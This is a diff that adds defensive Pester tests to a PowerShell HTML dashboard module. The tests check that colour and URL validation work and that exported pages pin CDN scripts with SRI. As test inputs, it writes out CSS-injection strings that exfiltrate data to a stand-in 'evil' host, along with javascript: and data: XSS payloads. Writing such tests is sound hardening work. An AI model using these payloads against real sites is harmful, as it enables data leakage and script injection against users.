@@ -3002,3 +3002,158 @@ Describe 'Add-DhTopologyMap' {
         }
     }
 }
+
+# ============================================================================
+#  v1.5.3 — security hardening
+# ============================================================================
+
+Describe 'Security: Add-DhPieChart slice Color validation' {
+    BeforeEach {
+        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
+    }
+    It 'accepts hex literals (#fff, #ffffff, #ffffffff)' {
+        { Add-DhPieChart -Report $script:report -Id 'p1' -Title 't' -Slices @(
+            @{ Label='a'; Value=1; Color='#fff'      }
+            @{ Label='b'; Value=1; Color='#1B6B35'   }
+            @{ Label='c'; Value=1; Color='#1B6B3580' }
+        ) } | Should -Not -Throw
+    }
+    It 'accepts rgb()/rgba()/hsl()/hsla() and var(--token)' {
+        { Add-DhPieChart -Report $script:report -Id 'p2' -Title 't' -Slices @(
+            @{ Label='a'; Value=1; Color='rgb(10, 20, 30)' }
+            @{ Label='b'; Value=1; Color='rgba(0,0,0,0.5)' }
+            @{ Label='c'; Value=1; Color='hsl(120,50%,40%)' }
+            @{ Label='d'; Value=1; Color='var(--accent-primary)' }
+        ) } | Should -Not -Throw
+    }
+    It 'rejects a CSS-injection payload (semicolon and url())' {
+        { Add-DhPieChart -Report $script:report -Id 'p3' -Title 't' -Slices @(
+            @{ Label='evil'; Value=1; Color='red; background-image: url(http://evil/log?u=PII)' }
+        ) } | Should -Throw -ExpectedMessage '*Add-DhPieChart: slice*Color*not a recognised CSS colour*'
+    }
+    It 'rejects parentheses outside a recognised function' {
+        { Add-DhPieChart -Report $script:report -Id 'p4' -Title 't' -Slices @(
+            @{ Label='evil'; Value=1; Color='attr(data-x)' }
+        ) } | Should -Throw -ExpectedMessage '*not a recognised CSS colour*'
+    }
+}
+
+Describe 'Security: Add-DhLineChart series Color validation' {
+    BeforeEach {
+        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
+    }
+    It 'rejects a CSS-injection payload on a series Color' {
+        { Add-DhLineChart -Report $script:report -Id 'l1' -Title 't' `
+            -XAxis @('Mon','Tue','Wed') -Series @(
+                @{ Label='evil'; Values=@(1,2,3); Color='red;background:url(http://evil/x)' }
+            ) } | Should -Throw -ExpectedMessage '*Add-DhLineChart: series*Color*not a recognised CSS colour*'
+    }
+    It 'accepts a clean hex color' {
+        { Add-DhLineChart -Report $script:report -Id 'l2' -Title 't' `
+            -XAxis @('Mon','Tue') -Series @(
+                @{ Label='clean'; Values=@(1,2); Color='#1B6B35' }
+            ) } | Should -Not -Throw
+    }
+}
+
+Describe 'Security: Add-DhAlertBanner Action.Url scheme validation' {
+    BeforeEach {
+        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
+    }
+    It 'rejects javascript: URLs' {
+        { Add-DhAlertBanner -Report $script:report -Id 'b1' -Severity 'info' `
+            -Message 'msg' -Action @{ Label='click'; Url='javascript:alert(1)' } } |
+            Should -Throw -ExpectedMessage '*scheme that is not allowed*'
+    }
+    It 'rejects data: URLs' {
+        { Add-DhAlertBanner -Report $script:report -Id 'b2' -Severity 'info' `
+            -Message 'msg' -Action @{ Label='click'; Url='data:text/html,<script>alert(1)</script>' } } |
+            Should -Throw -ExpectedMessage '*scheme*not allowed*'
+    }
+    It 'accepts https://, http://, mailto:, tel:, and #anchor' {
+        { Add-DhAlertBanner -Report $script:report -Id 'b3' -Severity 'info' `
+            -Message 'msg' -Action @{ Label='click'; Url='https://example.com/path' } } | Should -Not -Throw
+        { Add-DhAlertBanner -Report $script:report -Id 'b4' -Severity 'info' `
+            -Message 'msg' -Action @{ Label='click'; Url='mailto:ops@example.com' } } | Should -Not -Throw
+        { Add-DhAlertBanner -Report $script:report -Id 'b5' -Severity 'info' `
+            -Message 'msg' -Action @{ Label='click'; Url='#somewhere' } } | Should -Not -Throw
+    }
+}
+
+Describe 'Security: Add-DhSummary tile Action.Url scheme validation' {
+    BeforeEach {
+        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
+    }
+    It 'rejects javascript: URLs on tile Actions' {
+        { Add-DhSummary -Report $script:report -Items @(
+            @{ Label='Total'; Value=1; Action=@{ Label='go'; Url='javascript:alert(1)' } }
+        ) } | Should -Throw -ExpectedMessage '*scheme that is not allowed*'
+    }
+    It 'accepts https tile Action URLs' {
+        { Add-DhSummary -Report $script:report -Items @(
+            @{ Label='Total'; Value=1; Action=@{ Label='go'; Url='https://intra.example.com/dash' } }
+        ) } | Should -Not -Throw
+    }
+}
+
+Describe 'Security: ConvertTo-DhJsonString line/paragraph separator escaping' {
+    # ConvertTo-DhJsonString is a Private helper (not exported), and InModuleScope
+    # fails when a previously installed copy of DashHtml is also loaded in the
+    # session (e.g. after Publish-Module). Drive the helper through a public sink:
+    # we put U+2028 and U+2029 into a Summary tile Label, render the dashboard,
+    # and verify the embedded SUMMARY_CONFIG JSON contains the escaped sequences
+    # instead of raw line terminators. End-to-end test, immune to InModuleScope.
+    BeforeAll {
+        $script:srcHtmlSep = $null
+        try {
+            $rpt = New-DhDashboard -Title 'sec-sep' -Theme 'Default'
+            Add-DhSummary -Report $rpt -Items @(
+                @{ Label=('ls' + [char]0x2028 + 'tail'); Value=1 }
+                @{ Label=('ps' + [char]0x2029 + 'tail'); Value=2 }
+            )
+            $tmpPath = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_sep_test_$([guid]::NewGuid().ToString('N')).html")
+            Export-DhDashboard -Report $rpt -OutputPath $tmpPath -Force | Out-Null
+            $script:srcHtmlSep = Get-Content -LiteralPath $tmpPath -Raw
+            Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue
+        } catch {
+            $script:srcHtmlSep = "ERROR: $($_.ToString())"
+        }
+    }
+    It 'embeds U+2028 as the literal \u2028 escape inside the JS payload' {
+        $script:srcHtmlSep | Should -Match 'ls\\u2028tail'
+        # Negative: the raw line separator must not survive in the script block
+        $script:srcHtmlSep -match ([regex]::Escape('ls' + [char]0x2028 + 'tail')) | Should -BeFalse
+    }
+    It 'embeds U+2029 as the literal \u2029 escape inside the JS payload' {
+        $script:srcHtmlSep | Should -Match 'ps\\u2029tail'
+        $script:srcHtmlSep -match ([regex]::Escape('ps' + [char]0x2029 + 'tail')) | Should -BeFalse
+    }
+}
+
+Describe 'Security: exported HTML pins CDN scripts with SRI' {
+    # Build the rendered HTML once at discovery time. Pester 5 runs Discovery and
+    # Run in separate phases; computing the export in BeforeAll keeps the It body
+    # tiny (and lets us pinpoint the failure if Export-DhDashboard ever changes).
+    BeforeAll {
+        $script:srcHtmlSri = $null
+        try {
+            $rpt = New-DhDashboard -Title 'sec' -Theme 'Default'
+            Add-DhSummary -Report $rpt -Items @( @{ Label='x'; Value=1 } )
+            $tmpPath = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_sri_test_$([guid]::NewGuid().ToString('N')).html")
+            Export-DhDashboard -Report $rpt -OutputPath $tmpPath -Force | Out-Null
+            $script:srcHtmlSri = Get-Content -LiteralPath $tmpPath -Raw
+            Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue
+        } catch {
+            $script:srcHtmlSri = "ERROR: $($_.ToString())"
+        }
+    }
+    It 'pins xlsx with sha384 SRI' {
+        $script:srcHtmlSri | Should -Match 'xlsx\.full\.min\.js" integrity="sha384-'
+    }
+    It 'pins jspdf with sha384 SRI' {
+        $script:srcHtmlSri | Should -Match 'jspdf\.umd\.min\.js" integrity="sha384-'
+    }
+    It 'pins jspdf-autotable with sha384 SRI' {
+        $script:srcHtmlSri | Should -Match 'jspdf\.plugin\.autotable\.min\.js" integrity="sha384-'
+    }
+}
